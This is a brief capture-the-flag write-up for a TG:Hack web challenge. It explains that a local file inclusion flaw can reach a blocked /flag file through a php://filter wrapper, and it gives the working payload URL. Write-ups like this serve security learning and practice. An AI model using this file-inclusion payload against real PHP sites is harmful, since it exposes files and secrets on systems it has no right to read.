> Author: Solli#0387

## Chall
### Description

    Here we are filterings flags, can you still get to it?

    Link: ``filteredflaginc.chall.tghack.no``


### Solution

LFI but we cannot access /flag directly. However we can use php filters:

`http://localhost:8080/?page=php://filter/resource=/flag`
